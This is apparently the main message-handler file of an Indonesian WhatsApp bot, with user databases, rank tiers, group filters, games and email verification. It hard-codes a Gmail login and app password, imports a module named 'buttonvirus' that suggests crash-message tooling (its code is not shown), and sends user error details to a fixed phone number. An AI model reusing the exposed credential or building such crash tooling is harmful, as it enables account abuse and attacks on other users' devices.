require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage } = require("@adiwajshing/baileys");
const fs = require("fs");
const util = require("util");
const fetch = require("node-fetch")
const FormData = require('form-data')
const brainly = require('brainly-scraper')
const canvas = require('canvas')
const cheerio = require('cheerio')
const canva = require('knights-canvas')
const translate = require('@vitalets/google-translate-api')
const canva2 = require('canvas-hikki-2')
const dhn = require('dhn-api')
const ms = require('ms')
const { buttonvirus } = require('./lib/buttonvirus')
const bocil = require('@bochilteam/scraper')
const tiktok = require('node-tiklydown').v1
const chalk = require("chalk");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const { Configuration, OpenAIApi } = require("openai");
const ggs = require('google-it')
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const request = require('request')
const ffmpeg = require("fluent-ffmpeg")
const axios = require('axios')
const mailer = require('nodemailer')
const kbbi = require('kbbi-scraper')
const qrcode = require('qrcode')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const moment = require('moment-timezone')
const asyus = new Date()
const { Swiftcord } = require("swiftcord");
const canpas = new Swiftcord();
const Math_js = require('mathjs')
const FileType = require('file-type')
const jimp = require('jimp')
const xfarr = require('xfarr-api')
const path = require('path')
const os = require('os')
const { exec, spawn, execSync } = require("child_process");
const speed = require('performance-now')
const PhoneNumber = require('awesome-phonenumber') 

//━━━━━━━━━━━━━━━[ DATABASE ]━━━━━━━━━━━━━━━━━//

let vote = global.db.data.others.vote = []
let visitor = global.db.data.visitor
let web = global.db.data.web
let confirmation = {}
global.premium = global.db.data.premium

//━━━━━━━━━━━━━━━[ MODULE ]━━━━━━━━━━━━━━━━━//

const { maker, photooxy, ephoto } = require('./lib/photooxy.js')
const { tanggal, 
wib, 
wita, 
wit, 
formatp,
clockString,
parseMention,
isUrl,
bytesToSize,
sleep,
jsonformat,
runtime,
getRandom,
ucapan,
fetchJson, 
getBuffer,
color,
pickRandom } = require('./lib/function')
const { linkwa,
quotesAnime,
katabijak,
wikimedia,
gempa,
pinterest,
wiki,
googleImage,
lirikLagu,
wallanime,
sfilesearch,
ttp,
style,
ringtone,
trendtwit,
githubstalk } = require('./lib/scraper')
const levelling = require('./lib/levelling')

//━━━━━━━━━━━━━━━[ CONFIG ]━━━━━━━━━━━━━━━━━//

hit_today = []
global.hit = {}

//━━━━━━━━━━━━━━━[ FUNCTION ]━━━━━━━━━━━━━━━━━//

module.exports = conn = async (conn, m, chatUpdate, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectm.reply.selectedRowId : (m.mtype == 'templateButtonm.replyMessage') ? m.message.templateButtonm.replyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectm.reply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
const isCmd = body.includes(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushName = m.pushName || "NPC";
const nomorBot = await conn.decodeJid(conn.user.id);
const itsMeconn = [nomorBot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [nomorBot, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == nomorBot ? true : false;
const text = q = args.join(" ")
const arg = budy.trim().substring(budy.indexOf(" ") + 1);
const arg1 = arg.trim().substring(arg.indexOf(" ") + 1);
const dari = m.chat;
const from = m.key.remoteJid
const sender = m.sender
const reply = m.reply
const mek = chatUpdate.messages[0];
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const argsLog = budy.length > 30 ? `${q.substring(0, 30)}...` : budy;
hit_today.push(command)
	
//━━━━━━━━━━━━━━━[ GROUP ]━━━━━━━━━━━━━━━━━//

const isGroup = m.key.remoteJid.endsWith('@g.us')
const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(nomorBot) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

//━━━━━━━━━━━━━━━[ TAMBAHAN ]━━━━━━━━━━━━━━━━━//

if (budy.includes('Assalammualaikum')) {  
conn.sendMessage(m.chat, {text: 'Waalaikumsalam Warahmatullahi Wabarakatuh'}, {quoted: m})
}
if (budy.includes('Asalamuaalaikum')) {  
conn.sendMessage(m.chat, {text: 'Waalaikumsalam Warahmatullahi Wabarakatuh'}, {quoted: m})
}
if (budy.includes('asalammualaikum')) {  
conn.sendMessage(m.chat, {text: 'Waalaikumsalam Warahmatullahi Wabarakatuh'}, {quoted: m})
}
if (budy.includes('Asalammualaikum')) {  
conn.sendMessage(m.chat, {text: 'Waalaikumsalam Warahmatullahi Wabarakatuh'}, {quoted: m})
}

if (!conn.public) {
if (!isCreator) return
}

//━━━━━━━━━━━━━━━[ READ CHAT ]━━━━━━━━━━━━━━━━━//

async function read() {
const readnya = {
remoteJid: m.key.remoteJid,
id: m.key.id,
participant: m.key.participant
}
conn.readMessages([readnya])
}
read()

//━━━━━━━━━━━━━━━[ FUNCTION ]━━━━━━━━━━━━━━━━━//
const role = () => {
let user = global.db.data.users[m.sender]
let role = (user.level <= 3) ? 'Warrior V'
        : ((user.level >= 3) && (user.level <= 6)) ? 'Warrior IV'
            : ((user.level >= 6) && (user.level <= 9)) ? 'Warrior III'
                : ((user.level >= 9) && (user.level <= 12)) ? 'Warrior II'
                    : ((user.level >= 12) && (user.level <= 15)) ? 'Warrior I'
                        : ((user.level >= 15) && (user.level <= 18)) ? 'Elite V'
                            : ((user.level >= 18) && (user.level <= 21)) ? 'Elite IV'
                                : ((user.level >= 21) && (user.level <= 24)) ? 'Elite III'
                                    : ((user.level >= 24) && (user.level <= 27)) ? 'Elite II'
                                        : ((user.level >= 27) && (user.level <= 30)) ? 'Elite I'
                                            : ((user.level >= 30) && (user.level <= 33)) ? 'Master V'
                                                : ((user.level >= 33) && (user.level <= 36)) ? 'Master IV'
                                                    : ((user.level >= 36) && (user.level <= 39)) ? 'Master III'
                                                        : ((user.level >= 39) && (user.level <= 42)) ? 'Master II'
                                                            : ((user.level >= 42) && (user.level <= 45)) ? 'Master I'
                                                                : ((user.level >= 45) && (user.level <= 48)) ? 'Grand Master V'
                                                                    : ((user.level >= 48) && (user.level <= 51)) ? 'Grand Master IV'
                                                                        : ((user.level >= 51) && (user.level <= 54)) ? 'Grand Master III'
                                                                            : ((user.level >= 54) && (user.level <= 57)) ? 'Grand Master II'
                                                                                : ((user.level >= 57) && (user.level <= 60)) ? 'Grand Master I'
                                                                                    : ((user.level >= 60) && (user.level <= 63)) ? 'Epic V'
                                                                                        : ((user.level >= 63) && (user.level <= 66)) ? 'Epic IV'
                                                                                            : ((user.level >= 66) && (user.level <= 69)) ? 'Epic III'
                                                                                                : ((user.level >= 69) && (user.level <= 71)) ? 'Epic II'
                                                                                                    : ((user.level >= 71) && (user.level <= 74)) ? 'Epic I'
                                                                                                        : ((user.level >= 74) && (user.level <= 77)) ? 'Legend V'
                                                                                                            : ((user.level >= 77) && (user.level <= 80)) ? 'Legend IV'
                                                                                                                : ((user.level >= 80) && (user.level <= 83)) ? 'Legend III'
                                                                                                                    : ((user.level >= 83) && (user.level <= 86)) ? 'Legend II'
                                                                                                                        : ((user.level >= 86) && (user.level <= 89)) ? 'Legend I'
                                                                                                                            : ((user.level >= 89) && (user.level <= 91)) ? 'Mythic V'
                                                                                                                                : ((user.level >= 91) && (user.level <= 94)) ? 'Mythic IV'
                                                                                                                                    : ((user.level >= 94) && (user.level <= 97)) ? 'Mythic III'
                                                                                                                                        : ((user.level >= 97) && (user.level <= 100)) ? 'Mythic II'
                                                                                                                                           : ((user.level >= 100) && (user.level <= 105)) ? 'Mythic I'      
                                                                                                                                              : ((user.level >= 105) && (user.level <= 120)) ? 'Mythical glory'
                                                                                                                                                 : ((user.level >= 120) && (user.level <= 130)) ? 'Mythical glory 700'
                                                                                                                                                    : ((user.level >= 150) && (user.level <= 160)) ? 'Mythical glory 800'
                                                                                                                                                        : ((user.level >= 160) && (user.level <= 170)) ? 'Mythical glory 900'
                                                                                                                                                            : ((user.level >= 170) && (user.level <= 185)) ? 'Mythical glory 1000'
                                                                                                                                                                : ((user.level >= 185) && (user.level <= 200)) ? 'Mythical glory 1100'
                                                                                                                                                                    : ((user.level >= 200) && (user.level <= 400)) ? 'Mythical glory 1200'
                                                                                                                                                                        : ((user.level >= 405) && (user.level <= 450)) ? 'Mythical glory 1300'
                                                                                                 : ((user.level >= 700) && (user.level <= 1000)) ? 'Mythical glory 100000'
                                                                                                                                                                        : 'God👑'
return role
}

let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('simi' in chats)) chats.simi = false
if (!('antitoxic' in chats)) chats.antitoxic = false
if (!('antilink' in chats)) chats.antilink = false
if (!('nsfw' in chats)) chats.nsfw = false
if (!('antiviewonce' in chats)) chats.antiviewonce = true
} else global.db.data.chats[m.chat] = {
simi: false,
antilink: false,
nsfw: false,
antitoxic: false,
antiviewonce: true,
}

let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = db.data.users[m.sender]
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
if (typeof user !== 'object') db.data.users[m.sender] = {}
if (user) {
if (!('registered' in user)) user.registered = false
if (!('nama' in user)) user.nama = ''
if (!('token' in user)) user.token = ''
if (!('email' in user)) user.email = ''
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!('money' in user)) user.money= 0
if (!('exp' in user)) user.exp = 0
if (!('level' in user)) user.level = 0
if (!('autolevelup' in user)) user.autolevelup = true
if (!('rename' in user)) user.rename = 3
if (!('lastclaim' in user)) user.lastclaim = 0
if (!('atm' in user)) user.atm = 0
if (!('role' in user)) user.role = ''
if (!('lastrob' in user)) user.lastrob = 0
if (!('tertangkap' in user)) user.tertangkap = 0
if (!('Banneduser' in user)) user.Banneduser = false
if (!('BannedReason' in user)) user.BannedReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
if (!isNumber(user.ojekk)) user.ojekk = 0
if (!isNumber(user.lastngojek)) user.lastngojek = 0
if (!isNumber(user.antispam)) user.antispam = 0
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
nama: '',
email: '',
registered: false,
token: '',
limit: limitUser,
money: 0,
exp: 0,
level: 0,
autolevelup: true,
rename: 3,
lastclaim: 0,
antispam: 0,
atm: 0,
role: '',
lastrob: 0,
tertangkap: 0,
Banneduser: false,
BannedReason: '',
lastngojek: 0,
ojekk: 0,
}

const duitadd = (amount) => {
const duitadd = db.data.users[m.sender].money += amount
return duitadd
}

reSize = (buffer, ukur1, ukur2) => {
    return new Promise(async(resolve, reject) => {
        var baper = await jimp.read(buffer);
        var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
        resolve(ab)
    })
}


const duitttc = (amount, sendernye) => {
const duitttc = db.data.users[sendernye].money += amount
return duittc
}

const cekduit = (sender) => {
const cekduit = db.data.users[sender].money
return cekduit
}

const expttc = (sendernyee, jumlah) => {
const expttc = db.data.users[sendernyee].exp += jumlah
return expttc
}

const addexp = () => {
const addexp = db.data.users[m.sender].exp += 45
return addexp
}

const limitadd = (amount) => {
const limitadd = global.db.data.users[m.sender].limit += amount
return limitadd
}

async function sendImageMentionsBuffer(url, texts, quoted){
await conn.sendMessage(m.chat, { image: url , caption: texts, mentions: [...texts.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted })
}

global.rpg = {
  emoticon(string) {
    string = string.toLowerCase()
    let emot = {
      level: '📊',
      limit: '🎫',
      health: '❤️',
      exp: '✨',
      money: '💹',
      atm: '🏦',
      potion: '🥤',
      diamond: '💎',
      common: '📦',
      uncommon: '🛍️',
      mythic: '🎁',
      legendary: '🗃️',
      superior: '💼',
      pet: '🔖',
      trash: '🗑',
      armor: '🥼',
      sword: '⚔️',
      pickaxe: '⛏️',
      fishingrod: '🎣',
      wood: '🪵',
      rock: '🪨',
      string: '🕸️',
      horse: '🐴',
      cat: '🐱',
      dog: '🐶',
      fox: '🦊',
      petFood: '🍖',
      iron: '⛓️',
      gold: '🪙',
      emerald: '❇️',
      upgrader: '🧰'
      
    }
    let results = Object.keys(emot).map(v => [v, new RegExp(v, 'gi')]).filter(v => v[1].test(string))
    if (!results.length) return ''
    else return emot[results[0][0]]
  }
}

  if (db.data.chats[m.chat].antilink) {
        if (budy.match(`chat.whatsapp.com`)) {
        	
        m.reply(`「 ANTI LINK 」\n\nKamu terdeteksi mengirim link group, harap untuk menghapus link tersebut atau akan di kick admin!`)
        if (!isBotAdmins) return m.reply(`Ehh bot gak admin T_T`)
        let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
        let isLinkconnGc = new RegExp(gclink, 'i')
        let isgclink = isLinkconnGc.test(m.text)
        if (isgclink) return m.reply(`Ehh maaf gak jadi, karena kamu ngirim link group ini`)
        if (isAdmins) return m.reply(`Ehh maaf kamu admin`)
        if (isCreator) return m.reply(`Ehh maaf kamu owner bot ku`)
        }
        }
        
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌃'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌅'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏙'
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌉'
 } 
        
conn.game = conn.game ? conn.game : {}
	    let room = Object.values(conn.game).find(room => room.id && room.game && room.state && room.id.includes('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
	    if (room) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    // m.reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room.game.currentTurn) { // nek wayahku
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
	    m.reply({
	    '-3': 'Game telah berakhir',
	    '-2': 'Invalid',
	    '-1': 'Posisi Invalid',
	    0: 'Posisi Invalid',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room.game.winner) isWin = true
	    else if (room.game.board === 511) isTie = true
	    let arr = room.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room.game._currentTurn = m.sender === room.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
	    let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room.x !== room.o) await conn.sendText(room.x, str, m, { mentions: parseMention(str) } )
	    await conn.sendText(room.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete conn.game[room.id]
	    }
	    }

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	    for (let jid of mentionUser) {
            let user = global.db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            conn.sendTextWithMentions(m.chat,`「 *SEDANG AFK* 」\n\n📛 *Name* : ${user.nama}\n👤 *User* : @${jid.split("@")[0]}\n⏰ *Selama* : ${clockString(new Date - afkTime)}\n✍️ *Alasan* : ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}`, m)
        }

        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            conn.sendTextWithMentions(m.chat, `「 *BERHENTI AFK* 」\n\n📛 *Name* : ${user.nama}\n👤 *User* : @${m.sender.split("@")[0]}\n⏰ *Selama* : ${clockString(new Date - user.afkTime)}\n✍️ *Setelah* : ${user.afkReason ? '' + user.afkReason : ''}`, m)
            user.afkTime = -1
            user.afkReason = ''
        }
        
function isToxic(budy) {
  for (let i = 0; i < toxic.length; i++) {
    const regex = new RegExp(`\\b${toxic[i]}\\b`, 'gi');
    if (regex.test(budy)) {
      return true;
    }
  }
  return false;
}


if (m.message) {
    conn.spam = conn.spam ? conn.spam : {}
    let chat = global.db.data.chats[m.chat]
    if (m.sender in conn.spam) {
        conn.spam[m.sender].count++
        if (m.messageTimestamp - conn.spam[m.sender].lastspam > 5) {
            if (conn.spam[m.sender].count > 5) {
    m.reply('*Jangan spam!*')
    }
            conn.spam[m.sender].count = 0
            conn.spam[m.sender].lastspam = m.messageTimestamp
        }
    }
    else
        conn.spam[m.sender] = {
            jid: m.sender,
            count: 0,
            lastspam: 0
        }
     }

/* rect = ['wadidaw', 'p', '.menu', 'bot', 'kntl', 'kontol',
'memek', 'ngentot', 'asu', 'owner', 'wandy', 'opay',
'bangsat', 'titit', 'tytyd', 'kecil', 'anak kecil', 'ogi',
'yatim', '.menu']

function reaction(budy) {
  for (let i = 0; i < toxic.length; i++) {
    const regex = new RegExp(`\\b${rect[i]}\\b`, 'gi');
    if (regex.test(budy)) {
      return true;
    }
  }
  return false;
}
*/

if (db.data.users[m.sender].Banneduser) {
if (db.data.chats[m.chat].antitoxic && budy && isToxic(budy) === true && isBotAdmins) {
await conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.id, participant: sender } })
waow = `─────────────────────
◪ *ANTITOXIC*
│
└ ❏ Nama : *${pushName}*
    ❏ Nomor : *${sender.replace('@s.whatsapp.net', '')}*
    ❏ Text : *${budy}*
    ❏ Waktu : *${wib()}*
    ❏ Tanggal : *${tanggal()}*
─────────────────────`
await conn.sendTextWithMentions(m.chat, waow, m)
}
}

function antiemror(){
  let useret = global.db.data.users[m.sender]
    if ((useret.money * 1) > 999999999999999999) {
        useret.money = 999999999999999999
    } else if ((useret.money * 1) < 0) {
        useret.money = 0
    }
    if (useret.money == NaN) {
    	useret.money = 0
    }
    if ((useret.exp * 1) > 999999999999999999999999999) {
         useret.exp = 999999999999999999999999999
    } else if ((useret.exp * 1) < 0) {
         useret.exp = 0
    }
    if ((useret.limit * 1) > 999999999999999999) {
         useret.limit = 999999999999999999
    } else if ((useret.limit * 1) < 0) {
         useret.limit = 0
    }
    if ((useret.bank * 1) > 999999999999999999) {
         useret.bank = 999999999999999999
    } else if ((useret.bank * 1) < 0) {
         useret.bank = 0
    }
    }

if (isCmd && !m.isGroup) {
//axios.get('https://api.countapi.xyz/hit/StealBotu/visits').then(({data}) => hit.all = data.value)
console.log(chalk.black(chalk.bgWhite("[ JEJAK ]")), color(argsLog, "turquoise"), chalk.magenta("Dari"), chalk.green(pushName), chalk.yellow(`[ ${sender.replace("@s.whatsapp.net", "")} ]`));
} else if (isCmd && m.isGroup) {
console.log(
chalk.black(chalk.bgWhite("[ JEJAK ]")),
color(argsLog, "turquoise"),
chalk.magenta("Dari"),
chalk.green(pushName),
chalk.yellow(`[ ${sender.replace("@s.whatsapp.net", "")} ]`),
chalk.blueBright("Di Grup"),
chalk.green(groupName)
);
}

if (command) {
visitor.count += 1
}

if (db.data.users[m.sender].Banneduser) {
if (m.msg) {
addexp()
duitadd(10)
antiemror()
}
}

global.error = async function error(text, quoted, chatnya){
nganu = '```'
hehe = util.format(text)
errornya = `「 *TERJADI KESALAHAN* 」\n\n${nganu}${hehe}${nganu}`
await conn.sendMessage(chatnya, { text: errornya }, { quoted })
mmm = `「 *TERJADI KESALAHAN* 」

⭔ *Name*: ${m.pushName}
⭔ *Command*: ${command}
⭔ *Error*:

${nganu}${hehe}${nganu}
`
await conn.sendMessage(`6282125039170@s.whatsapp.net`, { text: mmm})
}

//let jumlahCommand = require('util').inspect(hit.all)
let stamp = speed()
let sped = speed() - stamp

const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})

async function namaninja(teks){
let hasil = teks.replace(/[a-zA-Z]/gi, v => {
        switch (v.toLowerCase()) {
            case 'a': return 'ka';
            case 'b': return 'tu';
            case 'c': return 'mi';
            case 'd': return 'te';
            case 'e': return 'ku';
            case 'f': return 'lu';
            case 'g': return 'ji';
            case 'h': return 'ri';
            case 'i': return 'ki';
            case 'j': return 'zu';
            case 'k': return 'me';
            case 'l': return 'ta';
            case 'm': return 'rin';
            case 'n': return 'to';
            case 'o': return 'mo';
            case 'p': return 'no';
            case 'q': return 'ke';
            case 'r': return 'shi';
            case 's': return 'ari';
            case 't': return 'ci';
            case 'u': return 'do';
            case 'v': return 'ru';
            case 'w': return 'mei';
            case 'x': return 'na';
            case 'y': return 'fu';
            case 'z': return 'zi';
        }
    });
  return hasil;
}

async function purba(value){
 let hasil = value.replace(/[aiueo]/gi, v=> {
    switch(v.toLowerCase()){
      case 'a': return 'ove';
      case 'i': return 'ove';
      case 'u': return 'ove';
      case 'e': return 'ove';
      case 'o': return 'ove';
    }
  });
  return hasil;
}


function getToken(){
data = Math.random().toString(9).substr(2, 5);
return data
}

async function email(email, text){
	namauserkw = db.data.users[m.sender].nama
try {
var transporter = await mailer.createTransport({
service: 'gmail',
auth: {
user: 'zerobothelp@gmail.com',
pass: 'bxsseqwwrryqognf'
}
});


var mailOptions = {
from: 'zerobothelp@gmail.com',
to: email,
subject: 'ZERO-BOT VERIFICATION',
html: `<!DOCTYPE html>
<html>
<head>
	<title>Zero-Bot verification</title>
	<style>
		body {
			background-color: white;
			color: black;
			font-weight: bold;
			font-size: 30px;
			text-align: left,
			padding: 50px;
		}
	</style>
</head>
<h1>
	Selamat datang di WhatsApp bot Zero-Bot
</h1>
<p> Halo ${namauserkw}, </p>
<p> </p>
<p> Kode verifikasi anda adalah: </p>
<h2> ${text} </h2>
<p>  </p>
<p> </p>
<p> Note: Token expired 1 menit! </p>
</html>
`
};
await transporter.sendMail(mailOptions)
console.log('Done')
return true
} catch (e) {
	console.log(e)
}
}

function sort(property, ascending = true) {
  if (property) return (...args) => args[ascending & 1][property] - args[!ascending & 1][property]
  else return (...args) => args[ascending & 1] - args[!ascending & 1]
}

function toNumber(property, _default = 0) {
  if (property) return (a, i, b) => {
    return { ...b[i], [property]: a[property] === undefined ? _default : a[property] }
  }
  else return a => a === undefined ? _default : a
}

function enumGetKey(a) {
  return a.jid
}

async function levelUp(avatar) {
const image = await new canva.Up()
.setAvatar(avatar)
.toAttachment();
const data = image.toBuffer();
return data
}

async function progres(avatar, nama, expneed, expnow, levelnow, ){
const image = await new canva.Rank()
    .setAvatar(avatar)
    .setUsername(nama)
    .setBg("https://i.ibb.co/4YBNyvP/images-76.jpg")
    .setNeedxp(expneed)
    .setCurrxp(expnow)
    .setLevel(levelnow)
    .setRank("https://i.ibb.co/Wn9cvnv/FABLED.png") 
    .toAttachment();
  data = image.toBuffer();
  return data
  }
  
function randomkontol(){
gambar = [
{'result': 'https://telegra.ph/file/81260a8b9e8cff26d2b48.jpg'},
{'result': 'https://telegra.ph/file/ac4928f0824a2a0492737.jpg'},
{'result': 'https://telegra.ph/file/6359b013bc7e52c3b346f.jpg'},
{'result': 'https://telegra.ph/file/d43c89a5d2da72875ec05.jpg'},
{'result': 'https://telegra.ph/file/7d6c0e35f9c8f52715541.jpg'},
{'result': 'https://telegra.ph/file/ef4b742d47e6a9115e2ff.jpg'},
{'result': 'https://telegra.ph/file/55e5af5f33fbd57104187.jpg'},
{'result': 'https://telegra.ph/file/af236598456b95884bd15.jpg'},
{'result': 'https://telegra.ph/file/de92ed4a729887ffc974c.jpg'},
{'result': 'https://telegra.ph/file/00ce42a193b1dbbf907d4.jpg'}
]

resultnya = pickRandom(gambar)
return resultnya.result
}

async function p(nomot){
a = nomot.replace(" ", "")
b = a.replace("+", "")
c = b.replace("-", "")
return c
}

async function bugnomor(nomos){
s = await p(nomos)
e = s.replace("-", "")
return e
}

async function ppwa(conn, m) { 

let font = await jimp.loadFont('./name.fnt'), 
mask = await jimp.read('https://i.imgur.com/552kzaW.png'), 
welcome = await jimp.read(randomkontol()),  
avatar = await jimp.read(await conn.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')), 
status = (await conn.fetchStatus(m.sender).catch(console.log) || {}).status?.slice(0, 30) || 'Not Detected' 
  
await avatar.resize(460, 460) 
await mask.resize(460, 460) 
await avatar.mask(mask) 
await welcome.resize(welcome.getWidth(), welcome.getHeight()) 

await welcome.print(font, 550, 180, 'Name:') 
await welcome.print(font, 650, 255, nama.slice(0, 25)) 
await welcome.print(font, 550, 340, 'About:') 
await welcome.print(font, 650, 415, status) 
await welcome.print(font, 550, 500, 'Number:') 
await welcome.print(font, 650, 575, PhoneNumber('+' + m.sender.split('@')[0]).getNumber('international')) 
return await welcome.composite(avatar, 50, 170).getBufferAsync('image/png') 
}

if (db.data.users[m.sender].Banneduser) {
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}
}

const d = new Date
const locale = 'id'
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const info = db.data.settings.information
const limit = db.data.users[m.sender].limit
const namauser = db.data.users[m.sender].nama
const emailuser = db.data.users[m.sender].email
const registered = db.data.users[m.sender].registered
const level = db.data.users[m.sender].level
const ban = db.data.banned
const banned = db.data.users[m.sender].Banneduser
const alasanbanned = db.data.users[m.sender].BannedReason
const commandall = visitor.count
const website = web.website
const panel = web.panel
const atem = db.data.users[m.sender].atm
db.data.users[m.sender].role = role()

var emailorang = `-`
if (registered == true) {
var emailorang = emailuser
}
var titit = `❌`
if (registered == true) {
var titit = "✅"
}
var levelorang = `-`
if (registered == true) {
var levelorang = level
}
var ateem = `-`
if (registered == true) {
var ateem = atem
}
var duitorg = `-`
if (registered == true) {
var duitorg = cekduit(m.sender)
}
var nama = `-`
if (registered == true) {
var nama = namauser
}
var limitnya = `-`
if (registered == true) {
var limitnya = `${limit}${isPremium ? '' : ''}`
}
var premiumnya = `-`
if (registered == true) {
var premiumnya = `${isPremium ? 'Premium' : 'Free Only'}`
}
var rolenya = `-`
if (registered == true) {
var rolenya = role()
}
var bannedorg = `❌`
if (banned == true) {
var bannedorg = `✅`
}
